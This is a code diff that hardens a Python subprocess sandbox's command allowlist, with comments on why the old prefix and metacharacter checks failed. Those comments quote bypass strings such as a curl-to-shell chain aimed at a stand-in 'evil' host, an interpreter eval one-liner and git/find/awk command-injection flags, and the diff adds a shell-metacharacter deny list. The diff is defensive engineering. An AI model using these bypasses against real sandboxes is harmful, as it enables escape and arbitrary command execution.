@@ -241,10 +241,14 @@ def _jail_preexec() -> None:
 
         resource.setrlimit(resource.RLIMIT_AS, (JAIL_MAX_AS_BYTES, JAIL_MAX_AS_BYTES))
         resource.setrlimit(resource.RLIMIT_CPU, (JAIL_MAX_CPU_SECONDS, JAIL_MAX_CPU_SECONDS))
-        try:
-            resource.setrlimit(resource.RLIMIT_NPROC, (64, 64))
-        except Exception:
-            pass
+        # RLIMIT_NPROC is deliberately NOT set. It caps processes for the whole
+        # *real UID*, not for the child, so a fixed value only ever broke
+        # legitimate work: on any host where the operator already ran more than
+        # that many processes, every jailed command died with "Cannot fork"
+        # before doing anything. It also buys no isolation — a same-UID process
+        # is outside this jail entirely, which is why the module is documented
+        # as containment, NOT isolation. RLIMIT_CPU is what actually stops a
+        # runaway child, and it is set above.
         try:
             resource.setrlimit(resource.RLIMIT_FSIZE, (64 * 1024 * 1024, 64 * 1024 * 1024))
         except Exception:
@@ -253,26 +257,57 @@ def _jail_preexec() -> None:
         pass
 
 
+#: Binaries whose ``-c``/``-e``-style flags execute arbitrary code, so an
+#: allowlist entry for them is not a boundary unless those flags are refused.
+_INTERPRETER_EVAL_FLAGS = frozenset({"-c", "-e", "--eval", "-m", "--command"})
+
+
 def check_allowlist(command: str, allowlist: str) -> None:
-    """Enforce an optional comma-separated binary-prefix allowlist.
+    """Enforce an optional comma-separated binary allowlist.
 
     Empty allowlist = no restriction (approval gate still applies).
-    Otherwise the command must start with one of the prefixes AND must not
-    contain shell metachars that would escape the prefix (``;|&$`>\\n``).
-    Best-effort for shell strings — the approval gate remains primary.
+    Otherwise the command's **argv[0] basename** must be an allowlisted binary.
+    Matching argv[0] rather than the raw string matters twice over: a prefix
+    test let ``git`` authorise ``git-evil``, and a metachar blacklist
+    (``;|&$`><``) did nothing against an interpreter, because quotes, parens
+    and spaces were still allowed — so ``python3 -c
+    "__import__('os').popen('id').read()"`` passed with ``python3`` allowlisted.
     """
-    prefixes = [p.strip() for p in (allowlist or "").split(",") if p.strip()]
+    import shlex
+
+    prefixes = {Path(p.strip()).name for p in (allowlist or "").split(",") if p.strip()}
     if not prefixes:
         return
     stripped = command.strip()
-    if not any(stripped.startswith(p) for p in prefixes):
+    if not stripped:
+        raise SandboxError("empty command rejected under allowlist")
+    try:
+        argv = shlex.split(stripped)
+    except ValueError as exc:
+        raise SandboxError(f"command is not parseable under allowlist: {exc}") from exc
+    if not argv:
+        raise SandboxError("empty command rejected under allowlist")
+    program = Path(argv[0]).name
+    if program not in prefixes:
         raise SandboxError(
-            f"command not in allowlist (must start with one of: {', '.join(prefixes)})"
+            f"command not in allowlist (must be one of: {', '.join(sorted(prefixes))})"
         )
-    # Prefix match alone is bypassable (e.g. "python3; curl evil|sh").
-    # When an allowlist is configured, reject shell metachars outright.
-    if any(c in stripped for c in (";", "|", "&", "$", "`", "\n", ">", "<")):
+    if any(flag in argv[1:] for flag in _INTERPRETER_EVAL_FLAGS):
+        raise SandboxError(
+            f"{program} cannot run {sorted(_INTERPRETER_EVAL_FLAGS)} under an allowlist: "
+            "an eval flag is arbitrary code execution. Drop the entry or use the approval gate."
+        )
+    # SubprocessJail executes `["/bin/sh", "-c", command]`, so metachars really do
+    # re-enter the shell here: without this, `ls | evilcmd` passes the argv[0]
+    # check above and still pipes into a second command.
+    if any(c in stripped for c in (";", "|", "&", "$", "`", "\n", ">", "<", "(", ")", "{", "}")):
         raise SandboxError("command contains shell metachars rejected under allowlist")
+    # ponytail: this is argv containment, not isolation. A binary with a
+    # config-injection flag (`git -c alias.x=!cmd`, `find -exec`, `awk system()`)
+    # still executes commands as the same user, so allowlisting one of those
+    # cannot be made safe here. Treat allowlist entries as "this binary only",
+    # keep the approval gate primary, and prefer an interpreter-free allowlist
+    # (`ls,cat,rg`). Raise if a sandbox/isolation boundary is ever required.
 
 
 class SubprocessJail:
